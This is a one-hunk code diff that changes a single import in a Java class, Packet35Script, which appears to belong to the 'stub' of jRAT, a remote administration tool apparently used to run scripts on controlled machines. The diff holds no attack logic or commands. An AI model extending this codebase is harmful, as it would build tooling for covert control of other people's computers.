@@ -1,6 +1,6 @@
 package se.jrat.stub.packets.incoming;
 
-import se.jrat.stub.Script;
+import se.jrat.common.script.Script;
 
 public class Packet35Script extends AbstractIncomingPacket {
 
